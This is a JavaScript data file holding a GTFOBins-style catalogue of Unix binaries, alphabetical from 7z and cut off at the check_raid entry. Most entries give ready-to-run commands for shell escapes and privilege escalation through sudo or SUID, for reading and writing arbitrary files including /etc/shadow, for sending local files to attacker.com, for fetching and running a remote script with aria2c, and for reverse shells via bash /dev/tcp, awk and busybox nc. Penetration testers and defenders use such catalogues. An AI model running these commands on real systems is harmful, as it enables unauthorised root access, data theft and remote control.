export const Data = [
    {
        "7z": {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\n7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n",
                    },
                ],
            },
        },
        "aa-exec": {
            functions: {
                shell: [
                    {
                        code: "aa-exec /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./aa-exec /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo aa-exec /bin/sh",
                    },
                ],
            },
        },
        ab: {
            functions: {
                "file-upload": [
                    {
                        description: "Upload local file via HTTP POST request.",
                        code: "URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL\n",
                    },
                ],
                "file-download": [
                    {
                        description:
                            "Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.",
                        code: "URL=http://attacker.com/file_to_download\nab -v2 $URL\n",
                    },
                ],
                suid: [
                    {
                        description: "Upload local file via HTTP POST request.",
                        code: "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n",
                    },
                ],
                sudo: [
                    {
                        description: "Upload local file via HTTP POST request.",
                        code: "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n",
                    },
                ],
            },
        },
        agetty: {
            functions: {
                suid: [
                    {
                        code: "./agetty -o -p -l /bin/sh -a root tty",
                    },
                ],
            },
        },
        alpine: {
            description:
                "The file is displayed in the `alpine` curses terminal interface. Other options might be available, for example by pressing `S` is possible to save the file content elsewhere.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nalpine -F "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./alpine -F "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo alpine -F "$LFILE"\n',
                    },
                ],
            },
        },
        "ansible-playbook": {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nansible-playbook $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n",
                    },
                ],
            },
        },
        "ansible-test": {
            functions: {
                shell: [
                    {
                        code: "ansible-test shell",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ansible-test shell",
                    },
                ],
            },
        },
        aoss: {
            functions: {
                shell: [
                    {
                        code: "aoss /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo aoss /bin/sh",
                    },
                ],
            },
        },
        apache2ctl: {
            description:
                "This includes the file in the actual configuration file, the first line is leaked as an error message.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\napache2ctl -c "Include $LFILE" -k stop\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo apache2ctl -c "Include $LFILE" -k stop\n',
                    },
                ],
            },
        },
        "apt-get": {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "apt-get changelog apt\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo apt-get changelog apt\n!/bin/sh\n",
                    },
                    {
                        description: "For this to work the target package (e.g., `sl`) must not be installed.",
                        code: "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
                    },
                    {
                        description: "When the shell exits the `update` command is actually executed.",
                        code: "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
                    },
                ],
            },
        },
        apt: {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "apt changelog apt\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo apt changelog apt\n!/bin/sh\n",
                    },
                    {
                        description: "For this to work the target package (e.g., `sl`) must not be installed.",
                        code: "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
                    },
                    {
                        description: "When the shell exits the `update` command is actually executed.",
                        code: "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh",
                    },
                ],
            },
        },
        ar: {
            description: "The file appears amid the binary content of the archive.",
            functions: {
                "file-read": [
                    {
                        code: 'TF=$(mktemp -u)\nLFILE=file_to_read\nar r "$TF" "$LFILE"\ncat "$TF"\n',
                    },
                ],
                suid: [
                    {
                        code: 'TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r "$TF" "$LFILE"\ncat "$TF"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r "$TF" "$LFILE"\ncat "$TF"\n',
                    },
                ],
            },
        },
        aria2c: {
            description: "Note that the subprocess is immediately sent to the background.",
            functions: {
                command: [
                    {
                        code: "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n",
                    },
                    {
                        description:
                            "The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.",
                        code: "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.",
                        code: 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\naria2c -o "$LFILE" "$URL"\n',
                    },
                ],
                sudo: [
                    {
                        code: "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n",
                    },
                ],
            },
        },
        arj: {
            functions: {
                "file-read": [
                    {
                        description:
                            "The file appears amid some other textual information. The archive can also be downloaded then extracted offline.",
                        code: 'TF=$(mktemp -u)\nLFILE=file_to_read\narj a "$TF" "$LFILE"\narj p "$TF"\n',
                    },
                ],
                "file-write": [
                    {
                        description: "The archive can also be prepared offline then uploaded.",
                        code: 'TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >"$TF/$LFILE"\narj a "$TF/a" "$TF/$LFILE"\narj e "$TF/a" $LDIR\n',
                    },
                ],
                sudo: [
                    {
                        description: "The archive can also be prepared offline then uploaded.",
                        code: 'TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >"$TF/$LFILE"\narj a "$TF/a" "$TF/$LFILE"\nsudo arj e "$TF/a" $LDIR\n',
                    },
                ],
                suid: [
                    {
                        description: "The archive can also be prepared offline then uploaded.",
                        code: 'TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >"$TF/$LFILE"\narj a "$TF/a" "$TF/$LFILE"\n./arj e "$TF/a" $LDIR\n',
                    },
                ],
            },
        },
        arp: {
            description: "The read file content is corrupted by error prints.\n",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\narp -v -f "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./arp -v -f "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo arp -v -f "$LFILE"\n',
                    },
                ],
            },
        },
        as: {
            description:
                "The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nas @$LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./as @$LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo as @$LFILE\n",
                    },
                ],
            },
        },
        "ascii-xfr": {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nascii-xfr -ns "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./ascii-xfr -ns "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo ascii-xfr -ns "$LFILE"\n',
                    },
                ],
            },
        },
        ascii85: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nascii85 "$LFILE" | ascii85 --decode\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo ascii85 "$LFILE" | ascii85 --decode\n',
                    },
                ],
            },
        },
        ash: {
            functions: {
                shell: [
                    {
                        code: "ash",
                    },
                ],
                "file-write": [
                    {
                        code: "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n",
                    },
                ],
                suid: [
                    {
                        code: "./ash",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ash",
                    },
                ],
            },
        },
        aspell: {
            description:
                "The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\naspell -c "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./aspell -c "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo aspell -c "$LFILE"\n',
                    },
                ],
            },
        },
        at: {
            functions: {
                shell: [
                    {
                        code: 'echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null\n',
                    },
                ],
                command: [
                    {
                        description:
                            "The invocation will be blind, but it is possible to redirect the output to a file in a readable location.",
                        code: 'COMMAND=id\necho "$COMMAND" | at now\n',
                    },
                ],
                sudo: [
                    {
                        code: 'echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null\n',
                    },
                ],
            },
        },
        atobm: {
            description:
                "Outputs the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F "\'" \'{printf "%s", $2}\'\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F "\'" \'{printf "%s", $2}\'\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F "\'" \'{printf "%s", $2}\'\n',
                    },
                ],
            },
        },
        awk: {
            functions: {
                shell: [
                    {
                        code: "awk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT \'BEGIN {\n    s = "/inet/tcp/0/" RHOST "/" RPORT;\n    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description: "Run `nc target.com 12345` on the attacker box to connect to the shell.",
                        code: 'LPORT=12345\nawk -v LPORT=$LPORT \'BEGIN {\n    s = "/inet/tcp/" LPORT "/0/0";\n    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
                    },
                ],
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nawk '//' \"$LFILE\"\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./awk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
            },
        },
        aws: {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "aws help\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo aws help\n!/bin/sh\n",
                    },
                ],
            },
        },
        base32: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nbase32 "$LFILE" | base32 --decode\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\nbase32 "$LFILE" | base32 --decode\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo base32 "$LFILE" | base32 --decode\n',
                    },
                ],
            },
        },
        base58: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nbase58 "$LFILE" | base58 --decode\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo base58 "$LFILE" | base58 --decode\n',
                    },
                ],
            },
        },
        base64: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nbase64 "$LFILE" | base64 --decode\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo base64 "$LFILE" | base64 --decode\n',
                    },
                ],
            },
        },
        basenc: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n",
                    },
                ],
            },
        },
        basez: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nbasez "$LFILE" | basez --decode\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./basez "$LFILE" | basez --decode\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo basez "$LFILE" | basez --decode\n',
                    },
                ],
            },
        },
        bash: {
            functions: {
                shell: [
                    {
                        code: "bash",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'\n",
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        code: "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n",
                    },
                    {
                        description:
                            'Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.',
                        code: "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c \'{ echo -ne "GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ "$REPLY" = "$(echo -ne "\\r")" ] && break; done; cat; } > $LFILE\'\n',
                    },
                    {
                        description:
                            'Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.',
                        code: "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n",
                    },
                ],
                "file-write": [
                    {
                        code: "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'\n",
                    },
                    {
                        description: "This adds timestamps to the output file.",
                        code: "LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE\n",
                    },
                ],
                "file-read": [
                    {
                        description: "It trims trailing newlines and it's not binary-safe.",
                        code: "export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'\n",
                    },
                    {
                        description: "The read file content is surrounded by the current history content.",
                        code: "LFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory\n",
                    },
                ],
                "library-load": [
                    {
                        code: "bash -c 'enable -f ./lib.so x'",
                    },
                ],
                suid: [
                    {
                        code: "./bash -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo bash",
                    },
                ],
            },
        },
        batcat: {
            description:
                "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply. `--paging always` can be omitted provided that the output doesn't fit the screen.",
            functions: {
                shell: [
                    {
                        code: "batcat --paging always /etc/profile\n!/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./batcat --paging always /etc/profile\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo batcat --paging always /etc/profile\n!/bin/sh\n",
                    },
                ],
            },
        },
        bc: {
            description:
                "The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nbc -s $LFILE\nquit\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./bc -s $LFILE\nquit\n",
                    },
                ],
            },
        },
        bconsole: {
            functions: {
                shell: [
                    {
                        code: "bconsole\n@exec /bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo bconsole\n@exec /bin/sh\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.",
                        code: "bconsole -c /etc/shadow",
                    },
                ],
            },
        },
        bpftrace: {
            functions: {
                sudo: [
                    {
                        code: "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
                    },
                    {
                        code: "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n",
                    },
                    {
                        code: "sudo bpftrace -c /bin/sh -e 'END {exit()}'",
                    },
                ],
            },
        },
        bridge: {
            description:
                "Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nbridge -b "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./bridge -b "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo bridge -b "$LFILE"\n',
                    },
                ],
            },
        },
        bundle: {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
                        code: "bundle help\n!/bin/sh\n",
                    },
                    {
                        code: "export BUNDLE_GEMFILE=x\nbundle exec /bin/sh\n",
                    },
                    {
                        code: "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle exec /bin/sh\n",
                    },
                    {
                        description: "This spawns an interactive shell via [`irb`](/gtfobins/irb/).",
                        code: "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle console\nsystem('/bin/sh -c /bin/sh')\n",
                    },
                    {
                        code: "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundle install\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo bundle help\n!/bin/sh\n",
                    },
                ],
            },
        },
        bundler: {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
                        code: "bundler help\n!/bin/sh\n",
                    },
                    {
                        code: "export BUNDLE_GEMFILE=x\nbundler exec /bin/sh\n",
                    },
                    {
                        code: "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh\n",
                    },
                    {
                        description: "This spawns an interactive shell via [`irb`](/gtfobins/irb/).",
                        code: "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')\n",
                    },
                    {
                        code: "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo bundler help\n!/bin/sh\n",
                    },
                ],
            },
        },
        busctl: {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "busctl --show-machine\n!/bin/sh\n",
                    },
                    {
                        code: "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n",
                    },
                ],
                suid: [
                    {
                        code: "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'\n",
                    },
                ],
            },
        },
        busybox: {
            description:
                "BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFOBins binaries are supported. Here some example.",
            functions: {
                shell: [
                    {
                        code: "busybox sh",
                    },
                ],
                "file-upload": [
                    {
                        description: "Serve files in the local folder running an HTTP server.",
                        code: "LPORT=12345\nbusybox httpd -f -p $LPORT -h .\n",
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'\n",
                    },
                ],
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\n./busybox cat "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        description:
                            "It may drop the SUID privileges depending on the compilation flags and the runtime configuration.",
                        code: "./busybox sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo busybox sh",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -lvp 12345` on the attacker box to receive the shell.",
                        code: "RHOST=attacker.com\nRPORT=12345\nbusybox nc -e /bin/sh $RHOST $RPORT\n",
                    },
                ],
            },
        },
        byebug: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n",
                    },
                ],
            },
        },
        bzip2: {
            description:
                "There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n",
                    },
                ],
            },
        },
        c89: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nc89 -x c -E "$LFILE"\n',
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "c89 -wrapper /bin/sh,-s .",
                    },
                ],
                sudo: [
                    {
                        code: "sudo c89 -wrapper /bin/sh,-s .",
                    },
                ],
            },
        },
        c99: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nc99 -x c -E "$LFILE"\n',
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "c99 -wrapper /bin/sh,-s .",
                    },
                ],
                sudo: [
                    {
                        code: "sudo c99 -wrapper /bin/sh,-s .",
                    },
                ],
            },
        },
        cabal: {
            functions: {
                shell: [
                    {
                        code: "cabal exec -- /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./cabal exec -- /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo cabal exec -- /bin/sh",
                    },
                ],
            },
        },
        cancel: {
            functions: {
                "file-upload": [
                    {
                        description:
                            'Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.',
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u "$(cat $LFILE)" -h $RHOST:$RPORT\n',
                    },
                ],
            },
        },
        capsh: {
            functions: {
                shell: [
                    {
                        code: "capsh --",
                    },
                ],
                suid: [
                    {
                        code: "./capsh --gid=0 --uid=0 --",
                    },
                ],
                sudo: [
                    {
                        code: "sudo capsh --",
                    },
                ],
            },
        },
        cat: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\ncat "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./cat "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo cat "$LFILE"\n',
                    },
                ],
            },
        },
        cdist: {
            functions: {
                shell: [
                    {
                        code: "cdist shell -s /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo cdist shell -s /bin/sh",
                    },
                ],
            },
        },
        certbot: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n",
                    },
                ],
            },
        },
        check_by_ssh: {
            description:
                "This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n\nWhen `check_by_ssh` version `2.4.5` (2023-05-31) or later from the Nagios\nPlugins project in it's default configuration is used, it does not work anymore.\n\nIt does still work on previous versions from the Nagios Plugins project or\nall versions from the Monitoring Project (e.g. used by Ubuntu/Debian).\n",
            functions: {
                shell: [
                    {
                        description: "The shell will only last 10 seconds.",
                        code: 'check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx',
                    },
                ],
                sudo: [
                    {
                        description: "The shell will only last 10 seconds.",
                        code: 'sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx',
                    },
                ],
            },
        },
        check_cups: {
            description:
                "This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n",
                    },
                ],
            },
        },
        check_log: {
            description: "This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT\n",
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n",
                    },
                ],
            },
        },
        check_memory: {
            description:
                "This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n",
                    },
                ],
            },
        },
        check_raid: {
            description:
